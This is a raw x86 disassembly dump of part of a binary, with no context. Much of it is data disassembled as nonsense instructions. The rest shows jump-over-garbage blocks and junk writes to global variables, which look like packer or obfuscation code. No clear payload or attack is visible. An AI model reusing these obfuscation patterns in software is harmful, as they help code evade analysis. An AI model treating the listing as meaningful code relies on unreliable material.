  40dc9a:	xchg   esp,eax
  40dc9b:	mov    ds:0x7cfd92c6,eax
  40dca0:	popf   
  40dca1:	mov    dh,0xb5
  40dca3:	mov    bl,0x37
  40dca5:	xchg   edi,eax
  40dca6:	dec    edi
  40dca7:	dec    edx
  40dca8:	inc    edx
  40dca9:	loop   0x40dcd8
  40dcab:	(bad)  
  40dcac:	jge    0x40dc8e
  40dcae:	cmp    al,0xbc
  40dcb0:	cmp    ah,bl
  40dcb2:	sar    BYTE PTR [esi+eax*1],1
  40dcb5:	jo     0x40dc9e
  40dcb7:	ja     0x40dd12
  40dcb9:	pop    ebx
  40dcba:	xor    BYTE PTR [eax],al
  40dcbc:	imul   eax,DWORD PTR [ebp-0x44],0xfffffff4
  40dcc0:	sub    edx,edx
  40dcc2:	xchg   BYTE PTR [esi-0x5ba3622f],ah
  40dcc8:	in     al,0xd7
  40dcca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dccb:	fidiv  DWORD PTR [ebx+ecx*2-0x7c]
  40dccf:	ficom  DWORD PTR [edi-0x459a26a7]
  40dcd5:	scas   eax,DWORD PTR es:[edi]
  40dcd6:	mov    eax,0x30d303ba
  40dcdb:	out    dx,al
  40dcdc:	stos   DWORD PTR es:[edi],eax
  40dcdd:	fild   WORD PTR [eax]
  40dcdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dce0:	xchg   edi,eax
  40dce1:	push   0xffffff9b
  40dce3:	xchg   BYTE PTR [edx+0x42],cl
  40dce6:	sbb    eax,ebx
  40dce8:	add    eax,0xb732d86d
  40dced:	cmp    BYTE PTR ds:0x60e88a03,0xcb
  40dcf4:	mov    ds:0x346a08f8,al
  40dcf9:	dec    eax
  40dcfa:	popf   
  40dcfb:	mov    WORD PTR [ecx-0x68],ss
  40dcfe:	sbb    ah,BYTE PTR [edi+ebp*8]
  40dd01:	and    eax,0x3ba0686b
  40dd06:	(bad)  
  40dd07:	xor    eax,DWORD PTR [edi-0x20]
  40dd0a:	mov    esi,0x5736361e
  40dd0f:	dec    esp
  40dd10:	aaa    
  40dd11:	mov    ecx,0xe55e3387
  40dd16:	test   eax,0x7373ed7b
  40dd1b:	das    
  40dd1c:	cmp    BYTE PTR [ebp+0x42],dh
  40dd1f:	scas   al,BYTE PTR es:[edi]
  40dd20:	test   bl,bl
  40dd22:	es cmp ebp,ecx
  40dd25:	sbb    BYTE PTR [ebx-0x66],bl
  40dd28:	cmp    BYTE PTR [ebp+0x5f88d3c4],bl
  40dd2e:	xor    BYTE PTR [esi+0x5e],cl
  40dd31:	lds    ebx,FWORD PTR [eax]
  40dd33:	dec    edi
  40dd34:	xlat   BYTE PTR ds:[ebx]
  40dd35:	cdq    
  40dd36:	shl    DWORD PTR [ebx+0x19],0x93
  40dd3a:	dec    edx
  40dd3b:	mov    eax,ds:0x98596105
  40dd40:	push   eax
  40dd41:	add    DWORD PTR [ecx+edi*8+0x15],ecx
  40dd45:	jmp    0xf452:0xd4460bf9
  40dd4c:	xor    DWORD PTR [ebx-0x38],0x66445cd4
  40dd53:	mov    esp,0x92fe191e
  40dd58:	retf   0xb086
  40dd5b:	pop    DWORD PTR [edi]
  40dd5d:	and    DWORD PTR [ebx-0x20],eax
  40dd60:	xor    ah,dh
  40dd62:	mov    bl,0x3a
  40dd64:	mov    eax,0xb798565
  40dd69:	imul   esi,DWORD PTR [ecx-0x314e0120],0x879f53cb
  40dd73:	test   BYTE PTR [eax-0x2e],al
  40dd76:	inc    ebx
  40dd77:	inc    ebx
  40dd78:	hlt    
  40dd79:	out    dx,al
  40dd7a:	dec    edx
  40dd7b:	xchg   ebx,eax
  40dd7c:	fwait
  40dd7d:	enter  0x1e94,0xc9
  40dd81:	sub    bh,BYTE PTR ds:0xe22d1816
  40dd87:	jmp    0x55ad:0xf2e1f59
  40dd8e:	push   es
  40dd8f:	mov    ch,0x1e
  40dd91:	int3   
  40dd92:	push   ebx
  40dd93:	sbb    eax,0x9593d70f
  40dd98:	add    edi,DWORD PTR [ecx]
  40dd9a:	pop    ss
  40dd9b:	or     ebp,DWORD PTR [ebx+0x1fa04bbb]
  40dda1:	out    0xf6,al
  40dda3:	jnp    0x40dd49
  40dda5:	fidivr WORD PTR [edx-0xd2750f0]
  40ddab:	fucomip st,st(6)
  40ddad:	xor    BYTE PTR [edx+0x103cd075],bl
  40ddb3:	jecxz  0x40dd5b
  40ddb5:	mov    ebx,0xa777bd31
  40ddba:	test   BYTE PTR [eax-0x40],0xd1
  40ddbe:	or     cl,al
  40ddc0:	cld    
  40ddc1:	jo     0x40de22
  40ddc3:	sbb    edx,DWORD PTR [eax+0x61]
  40ddc6:	out    dx,al
  40ddc7:	lods   eax,DWORD PTR ds:[esi]
  40ddc8:	xlat   BYTE PTR ds:[ebx]
  40ddc9:	fcmovu st,st(2)
  40ddcb:	dec    esp
  40ddcc:	xchg   DWORD PTR [ebx],esp
  40ddce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddcf:	sub    DWORD PTR [ebx],edi
  40ddd1:	xor    esp,DWORD PTR [ebp+0x18]
  40ddd4:	sahf   
  40ddd5:	jge    0x40ddcf
  40ddd7:	in     al,dx
  40ddd8:	add    DWORD PTR [eax-0x6a34c72f],ebx
  40ddde:	cdq    
  40dddf:	(bad)  
  40dde1:	xlat   BYTE PTR ds:[ebx]
  40dde2:	cdq    
  40dde3:	mov    bh,0x6d
  40dde5:	push   DWORD PTR [esi-0x1f9d3273]
  40ddeb:	push   0xecef429b
  40ddf0:	pop    esp
  40ddf1:	sub    ah,BYTE PTR [eax-0x65]
  40ddf4:	sbb    al,0x23
  40ddf6:	cmp    dh,ah
  40ddf8:	in     eax,dx
  40ddf9:	mov    ds:0x6ec1e3f1,eax
  40ddfe:	jge    0x40ddd9
  40de00:	cmp    al,0x8e
  40de02:	test   ecx,0x5f2d4733
  40de08:	sti    
  40de09:	fcomp  st(7)
  40de0b:	lahf   
  40de0c:	jb     0x40de3e
  40de0e:	call   0x23bf:0x8abcb4e
  40de15:	xchg   esi,eax
  40de16:	lock dec ecx
  40de18:	sar    BYTE PTR [edx+0x4ce12b07],1
  40de1e:	mov    eax,ds:0xb8a3c603
  40de23:	cmp    eax,DWORD PTR [ecx+0x0]
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43379f,0x0
  40de5a:	mov    eax,ds:0x43379f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43379f,eax
  40de65:	cmp    DWORD PTR ds:0x43379f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43379f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x4337ef,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	div    DWORD PTR ds:0xbade8682
  40deab:	pushf  
  40deac:	jle    0x40df2c
  40deae:	adc    bh,BYTE PTR [edi+0x7e]
  40deb1:	jle    0x40df20
  40deb3:	dec    BYTE PTR [ebx-0x23b89b2c]
  40deb9:	imul   edx,ecx,0x7e
  40debc:	lock test DWORD PTR [esi+eiz*2-0x14a44ae2],ebp
  40dec4:	mov    al,ds:0xf72d1053
  40dec9:	mov    dl,0x92
  40decb:	pop    ebp
  40decc:	cmp    al,0x89
  40dece:	sub    eax,0x12deb08a
  40ded3:	jg     0x40ded7
  40ded5:	pop    esi
  40ded6:	in     eax,0x5d
  40ded8:	es (bad) 
  40dedb:	jp     0x40de90
  40dedd:	dec    ebx
  40dede:	add    ah,BYTE PTR [esp]
  40dee1:	out    dx,eax
  40dee2:	mov    bl,0x7a
  40dee4:	mov    al,ds:0xe37acb18
  40dee9:	add    eax,0x5495eb00
  40deee:	test   DWORD PTR [edx+0x5a],0x6cd346d4
  40def5:	mov    fs,esp
  40def7:	pop    es
  40def8:	(bad)  
  40def9:	fadd   DWORD PTR [eax-0x556f0639]
  40deff:	ss mov esi,0x8e0ee2e6
  40df05:	out    0x53,eax
  40df07:	pop    edi
  40df08:	fdiv   DWORD PTR [ecx+0x26]
  40df0b:	adc    eax,DWORD PTR [ecx-0x41]
  40df0e:	fcomp  DWORD PTR [edi-0x38]
  40df11:	pop    esp
  40df12:	push   0xffffffeb
  40df14:	inc    esi
  40df15:	iret   
  40df16:	add    eax,0x589d8c4
  40df1b:	(bad)  
  40df1c:	out    0x4,al
  40df1e:	xor    BYTE PTR [edx],0x72
  40df21:	lea    eax,[edx]
  40df23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df24:	jne    0x40deb1
  40df26:	mov    eax,0xb992a38a
  40df2b:	sub    dh,BYTE PTR [edx-0x345d1ec5]
  40df31:	popf   
  40df32:	mov    ch,0x54
  40df34:	push   edi
  40df35:	inc    edi
  40df36:	call   0x9aa4767a
  40df3b:	xchg   esp,eax
  40df3c:	xor    eax,0xcf8360da
  40df41:	test   eax,0x7b52edf8
  40df46:	mov    ebp,DWORD PTR [edi+0x73]
  40df49:	xor    ebx,DWORD PTR [esi-0x7e7db044]
  40df4f:	cmp    eax,0x597a5fee
  40df54:	and    BYTE PTR [eax-0x2370a069],bh
  40df5a:	leave  
  40df5b:	out    dx,al
  40df5c:	sub    cl,dl
  40df5e:	aam    0xb1
  40df60:	pop    ecx
  40df61:	jp     0x40dfca
  40df63:	repnz sbb DWORD PTR [ecx+0x1c],ebp
  40df67:	xchg   edx,eax
  40df68:	shl    DWORD PTR fs:[ebp-0x79],0x4f
  40df6d:	xchg   esi,eax
  40df6e:	mov    ah,0xdd
  40df70:	xchg   ch,cl
  40df72:	addr16 pushf 
  40df74:	aaa    
  40df75:	mov    eax,0xf385d7ad
  40df7a:	xchg   ebp,eax
  40df7b:	mov    BYTE PTR [esi],dh
  40df7d:	(bad)  
  40df7e:	fnstcw WORD PTR [ebx-0x2d]
  40df81:	sti    
  40df82:	aaa    
  40df83:	int3   
  40df84:	pop    esi
  40df85:	jne    0x40df16
  40df87:	arpl   bp,bx
  40df89:	sahf   
  40df8a:	xor    BYTE PTR [ecx],bl
  40df8c:	mov    ch,0x67
  40df8e:	in     eax,0xf0
  40df90:	mov    edx,0x2206f989
  40df95:	pop    ecx
  40df96:	dec    esi
  40df97:	lods   eax,DWORD PTR ds:[esi]
  40df98:	pop    ss
  40df99:	lock adc DWORD PTR [eax],ebp
  40df9c:	inc    esi
  40df9d:	jns    0x40df30
  40df9f:	cmp    dh,0xec
  40dfa2:	lahf   
  40dfa3:	jle    0x40df86
  40dfa5:	xor    BYTE PTR [edi+0x566be33c],dl
  40dfab:	mov    bl,0xf7
  40dfad:	or     eax,0x545e011a
  40dfb2:	(bad)  [edx+0xe]
  40dfb5:	sub    al,0x80
  40dfb7:	push   esi
  40dfb8:	popa   
  40dfb9:	sbb    BYTE PTR [edi+0xe495508],0xe2
  40dfc0:	add    al,0x65
  40dfc2:	cdq    
  40dfc3:	test   dh,bh
  40dfc5:	mov    ah,0x16
  40dfc7:	jl     0x40e025
  40dfc9:	daa    
  40dfca:	xlat   BYTE PTR ds:[ebx]
  40dfcb:	sbb    BYTE PTR [edx+0x2c],cl
  40dfce:	mov    eax,DWORD PTR [ebp+0x8]
  40dfd1:	sub    DWORD PTR ds:0x433797,0x625
  40dfdb:	push   ebx
  40dfdc:	sub    DWORD PTR ds:0x4337eb,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	mov    eax,ds:0x5e92e673
  40e008:	popf   
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40e00c
  40e010:	or     BYTE PTR [edx],dl
  40e012:	outs   dx,BYTE PTR ds:[esi]
  40e013:	mov    esi,0x3112680f
  40e018:	daa    
  40e019:	jl     0x40e03f
  40e01b:	cli    
  40e01c:	pop    ebx
  40e01d:	jecxz  0x40e023
  40e01f:	call   0x9fab:0x75614467
  40e026:	ret    0xc996
  40e029:	es pop ds
  40e02b:	xchg   ebp,eax
  40e02c:	add    al,0x6a
  40e02e:	rol    DWORD PTR [edi],1
  40e030:	pusha  
  40e031:	and    al,BYTE PTR [edx+0x3bde7b89]
  40e037:	fisub  WORD PTR [edi]
  40e039:	hlt    
  40e03a:	jp     0x40dfc0
  40e03c:	in     eax,0xbf
  40e03e:	cwde   
  40e03f:	mov    dl,0x39
  40e041:	sub    DWORD PTR [esi],ecx
  40e043:	cmp    DWORD PTR [edx-0x4851a59c],0xc8b077ad
  40e04d:	or     BYTE PTR [edi+eax*2-0x39],ch
  40e051:	or     ch,BYTE PTR [edx-0x1643b270]
  40e057:	inc    esi
  40e058:	dec    edx
  40e059:	mov    dh,0x47
  40e05b:	and    al,0x35
  40e05d:	push   ebx
  40e05e:	test   esp,esp
  40e060:	out    dx,eax
  40e061:	stos   DWORD PTR es:[edi],eax
  40e062:	imul   edi,DWORD PTR [edi+0x54e2c365],0xf3c97722
  40e06c:	add    al,0xe6
  40e06e:	pop    ss
  40e06f:	in     al,dx
  40e070:	(bad)  
  40e071:	imul   edi,esp,0xb46a5da5
  40e077:	outs   dx,BYTE PTR ds:[esi]
  40e078:	mov    eax,esp
  40e07a:	cmp    dl,BYTE PTR [edx+0x74569274]
  40e080:	and    DWORD PTR [edi-0x59],eax
  40e083:	or     BYTE PTR [esi],al
  40e085:	inc    ecx
  40e086:	scas   al,BYTE PTR es:[edi]
  40e087:	xchg   ebx,eax
  40e088:	out    0x11,al
  40e08a:	mov    ebx,0x7ce4d491
  40e08f:	aam    0xb9
  40e091:	lahf   
  40e092:	sub    esi,DWORD PTR [eax-0x6f8200b4]
  40e098:	cli    
  40e099:	int3   
  40e09a:	icebp  
  40e09b:	nop
  40e09c:	lods   eax,DWORD PTR ds:[esi]
  40e09d:	leave  
  40e09e:	inc    esi
  40e09f:	sti    
  40e0a0:	fstp   DWORD PTR [edx]
  40e0a2:	pop    ebp
  40e0a3:	jno    0x40e0d7
  40e0a5:	neg    BYTE PTR [ecx]
  40e0a7:	or     eax,0x857b0a1c
  40e0ac:	xor    BYTE PTR [edx-0x55c7f7da],0x73
  40e0b3:	fistp  QWORD PTR [ebx]
  40e0b5:	retf   0xcb3e
  40e0b8:	bound  esp,QWORD PTR [esi-0x1ffabe2c]
  40e0be:	mov    ds:0x10da913f,eax
  40e0c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0c4:	cli    
  40e0c5:	(bad)  
  40e0c7:	mov    al,0xfe
  40e0c9:	imul   edi,ebp,0x5b6c8504
  40e0cf:	pusha  
  40e0d0:	ins    BYTE PTR es:[edi],dx
  40e0d1:	dec    edi
  40e0d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0d3:	mov    eax,0x4ba24244
  40e0d8:	pop    esp
  40e0d9:	clc    
  40e0da:	adc    al,BYTE PTR [ebx+0x6d53ab97]
  40e0e0:	pop    ss
  40e0e1:	mov    al,0xa6
  40e0e3:	add    BYTE PTR [esi],0x3
  40e0e6:	jg     0x40e0c7
  40e0e8:	sbb    DWORD PTR [eax+0x38f59f60],ebp
  40e0ee:	lock mov bh,0xd7
  40e0f1:	ret    0xa39e
  40e0f4:	pop    es
  40e0f5:	pop    edi
  40e0f6:	add    eax,0x38e16b45
  40e0fb:	and    DWORD PTR [ebx+0x22],ecx
  40e0fe:	enter  0xcc25,0xf2
  40e102:	fst    DWORD PTR [edx+0x38]
  40e105:	and    eax,0x97665fe9
  40e10a:	push   0x9a55c447
  40e10f:	push   esi
  40e110:	jle    0x40e0c8
  40e112:	(bad)  
  40e113:	repz mov eax,0xb24fa8a2
  40e119:	pop    es
  40e11a:	fs and eax,0x6c0f8ccc
  40e120:	out    dx,al
  40e121:	pop    edx
  40e122:	mov    ch,0x8a
  40e124:	xchg   edx,eax
  40e125:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e126:	pop    ebp
  40e127:	out    0x79,eax
  40e129:	dec    ebx
  40e12a:	xlat   BYTE PTR ds:[ebx]
  40e12b:	xor    eax,esi
  40e12d:	adc    DWORD PTR ds:0x4337a3,0x2097
  40e137:	mov    ebx,0x32729b
  40e13c:	xor    DWORD PTR ds:0x4337ef,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	and    BYTE PTR [esi-0x658dbb0e],0x7e
  40e161:	jle    0x40e175
  40e163:	jg     0x40e1e3
  40e165:	jle    0x40e15a
  40e167:	xlat   BYTE PTR ds:[ebx]
  40e168:	push   0x5e
  40e16a:	jb     0x40e152
  40e16c:	mov    dh,0x24
  40e16e:	fimul  DWORD PTR [edx-0x998aa34]
  40e174:	aaa    
  40e175:	ret    0xb0a3
  40e178:	pusha  
  40e179:	ret    0xe6b
  40e17c:	mov    bl,BYTE PTR [edx]
  40e17e:	and    al,0x64
  40e180:	jne    0x40e123
  40e182:	aas    
  40e183:	jge    0x40e152
  40e185:	mov    ebx,0x4471b11d
  40e18a:	adc    al,0x2b
  40e18c:	push   edi
  40e18d:	pop    esp
  40e18e:	cwde   
  40e18f:	test   eax,0xa85e5335
  40e194:	sub    bl,ah
  40e196:	adc    dh,BYTE PTR [esp+edi*8+0x70251d9c]
  40e19d:	mov    ss,WORD PTR [edx+eiz*2]
  40e1a0:	shl    BYTE PTR [ebx+edi*4-0x7f],1
  40e1a4:	adc    al,0x46
  40e1a6:	arpl   WORD PTR [ebx-0xc],sp
  40e1a9:	std    
  40e1aa:	scas   al,BYTE PTR es:[edi]
  40e1ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1ac:	(bad)  
  40e1ae:	popf   
  40e1af:	pop    ds
  40e1b0:	dec    esp
  40e1b1:	(bad)  
  40e1b2:	mov    ds:0xca587ac2,al
  40e1b7:	(bad)  
  40e1b8:	fld    st(5)
  40e1ba:	int    0x22
  40e1bc:	out    dx,al
  40e1bd:	adc    DWORD PTR [eax-0x45],esp
  40e1c0:	sbb    DWORD PTR [edx+0x3fba7c8b],esi
  40e1c6:	imul   eax,ebx,0x8ebccd0a
  40e1cc:	bound  edx,QWORD PTR [eax-0x4d8afe87]
  40e1d2:	mov    ecx,0xf829d21
  40e1d7:	(bad)  
  40e1d8:	fwait
  40e1d9:	xchg   esi,eax
  40e1da:	add    ebx,0xb8d21328
  40e1e0:	pop    esp
  40e1e1:	inc    esi
  40e1e2:	out    0xd8,eax
  40e1e4:	mov    ebx,0xa36ab67a
  40e1e9:	sbb    BYTE PTR [edx+0x2e],0x6f
  40e1ed:	xchg   esi,eax
  40e1ee:	xor    bl,ch
  40e1f0:	test   al,0x66
  40e1f2:	sub    BYTE PTR [eax-0x7f22deff],dh
  40e1f8:	mov    ds:0xc32f44de,al
  40e1fd:	pop    esp
  40e1fe:	je     0x40e278
  40e200:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e201:	dec    edx
  40e202:	push   esp
  40e203:	mov    al,0x24
  40e205:	sub    DWORD PTR [ebp+0x3c],edi
  40e208:	or     BYTE PTR [ecx-0x54],cl
  40e20b:	xlat   BYTE PTR ds:[ebx]
  40e20c:	jbe    0x40e1f5
  40e20e:	cmc    
  40e20f:	mov    esi,0x4a771eb5
  40e214:	adc    eax,0x5c7cc0a7
  40e219:	sbb    esp,esi
  40e21b:	push   esp
  40e21c:	das    
  40e21d:	mov    edx,0xc44c9254
  40e222:	add    eax,0x2f917d69
  40e227:	outs   dx,BYTE PTR ds:[esi]
  40e228:	jb     0x40e226
  40e22a:	(bad)  
  40e22b:	fcomip st,st(4)
  40e22d:	test   BYTE PTR [ecx-0x2b9a1ef2],dl
  40e233:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e234:	jno    0x40e220
  40e236:	or     ebp,DWORD PTR [ecx]
  40e238:	fstp   QWORD PTR [eax-0x16]
  40e23b:	retf   0x5741
  40e23e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e23f:	xchg   edi,eax
  40e240:	mov    fs,WORD PTR [ebx-0x7]
  40e243:	rcr    DWORD PTR [ecx+0x7b2279dc],cl
  40e249:	and    eax,DWORD PTR [edx+0x67]
  40e24c:	outs   dx,DWORD PTR ds:[esi]
  40e24d:	cdq    
  40e24e:	imul   edi,DWORD PTR ss:[ebx],0x254bd7b9
  40e255:	xchg   edx,eax
  40e256:	inc    esi
  40e257:	outs   dx,DWORD PTR ds:[esi]
  40e258:	or     BYTE PTR [ecx-0x34a8d18f],0x4f
  40e25f:	adc    DWORD PTR [esi-0x2e55d2b7],ebx
  40e265:	out    0x31,eax
  40e267:	out    dx,al
  40e268:	xchg   esp,eax
  40e269:	or     BYTE PTR [ebx+0x64],ch
  40e26c:	pop    edi
  40e26d:	mul    DWORD PTR [edx-0x68]
  40e270:	pop    ss
  40e271:	adc    DWORD PTR ds:0xf769812c,ebx
  40e277:	jg     0x40e245
  40e279:	sbb    BYTE PTR [ebp-0x54],cl
  40e27c:	mov    ch,0x2b
  40e27e:	in     al,dx
  40e27f:	xor    DWORD PTR ds:0xe8458993,0xffffff8b
  40e286:	jge    0x40e290
  40e288:	inc    DWORD PTR ds:0x43370b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x4337e3,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x43382b
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433797,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43370b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x4337d7,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43379f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43371b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43381f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x43382b,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x4337df,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43381b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x4337d7,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x433753,0x43375f
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x4337a7,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x4337d3,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x4337d7,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433703,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433703,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433797,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433703,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x4337af,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x43382b
  40e3da:	and    DWORD PTR ds:0x43370b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x433763,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433813
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	outs   dx,BYTE PTR ds:[esi]
  40e415:	or     BYTE PTR [esi-0x6c],al
  40e418:	push   ss
  40e419:	cwde   
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e3b4
  40e421:	jne    0x40e3aa
  40e423:	or     cl,BYTE PTR [ebx+0x103b64bf]
  40e429:	out    dx,al
  40e42a:	lock fist WORD PTR [eax+ebx*8-0x29]
  40e42f:	addr16 sub al,0x5f
  40e432:	add    ebx,edi
  40e434:	call   0x3da4:0xef9714b9
  40e43b:	or     esp,eax
  40e43d:	out    dx,al
  40e43e:	mov    ds,WORD PTR [eax+0x57]
  40e441:	cli    
  40e442:	rol    BYTE PTR [ecx],1
  40e444:	scas   al,BYTE PTR es:[edi]
  40e445:	(bad)  
  40e447:	es mov bl,0x53
  40e44a:	xor    al,0x8e
  40e44c:	push   eax
  40e44d:	cmc    
  40e44e:	addr16 sbb ah,0xeb
  40e452:	pushf  
  40e453:	or     BYTE PTR [ebp-0x36],al
  40e456:	pop    esp
  40e457:	xor    BYTE PTR [ecx+0x599aa78e],al
  40e45d:	adc    DWORD PTR [edi],esp
  40e45f:	mov    ch,0xc3
  40e461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e462:	fsubr  st(3),st
  40e464:	test   edi,ebp
  40e466:	adc    al,BYTE PTR [ebp-0x69a6f2b1]
  40e46c:	enter  0x7c96,0x93
  40e470:	std    
  40e471:	jle    0x40e4a2
  40e473:	mov    esp,0xc119bc9d
  40e478:	sub    bl,BYTE PTR [esi+edi*4-0x648c4657]
  40e47f:	lods   eax,DWORD PTR ds:[esi]
  40e480:	es arpl si,di
  40e483:	dec    esp
  40e484:	mov    ah,0x2e
  40e486:	and    esp,edi
  40e488:	test   DWORD PTR [ebx-0x39b88467],0x98aa8129
  40e492:	xchg   esp,eax
  40e493:	mov    ?,WORD PTR [esi+ebp*4+0x1]
  40e497:	mov    ds:0xad0016b,eax
  40e49c:	mov    ebp,0xb60b6381
  40e4a1:	jl     0x40e4aa
  40e4a3:	std    
  40e4a4:	nop
  40e4a5:	fild   DWORD PTR cs:[esi]
  40e4a8:	mov    ebp,0xc8163b84
  40e4ad:	nop
  40e4ae:	cmp    al,0x70
  40e4b0:	lock das 
  40e4b2:	ret    0x29ef
  40e4b5:	add    al,0xe6
  40e4b7:	in     al,0x44
  40e4b9:	inc    ebp
  40e4ba:	cwde   
  40e4bb:	inc    eax
  40e4bc:	mov    esi,0x78e9a6ec
  40e4c1:	outs   dx,BYTE PTR ds:[esi]
  40e4c2:	in     al,dx
  40e4c3:	xchg   esp,eax
  40e4c4:	sbb    ebx,DWORD PTR [ebx]
  40e4c6:	js     0x40e4c3
  40e4c8:	outs   dx,BYTE PTR ds:[esi]
  40e4c9:	retf   
  40e4ca:	imul   ebp,DWORD PTR [edx-0x138fdf7d],0x1ff29bc1
  40e4d4:	icebp  
  40e4d5:	in     al,0xd5
  40e4d7:	test   BYTE PTR [eax+0x17dfbdc0],bh
  40e4dd:	pop    esp
  40e4de:	ins    DWORD PTR es:[edi],dx
  40e4df:	sti    
  40e4e0:	mov    ds:0x70a2d9a9,al
  40e4e5:	pop    es
  40e4e6:	test   eax,0x5ec0957d
  40e4eb:	les    ebp,FWORD PTR [edi-0x14]
  40e4ee:	inc    ebx
  40e4ef:	adc    DWORD PTR [edx+0x70],ebp
  40e4f2:	or     bl,0xb3
  40e4f5:	jmp    0x40b039c7
  40e4fa:	pop    edx
  40e4fb:	dec    ebp
  40e4fc:	sti    
  40e4fd:	adc    eax,0x7dbab78
  40e502:	lock scas al,BYTE PTR es:[edi]
  40e504:	sub    BYTE PTR [edi],bh
  40e506:	fnsave [ebp-0x6a909edb]
  40e50c:	loop   0x40e559
  40e50e:	das    
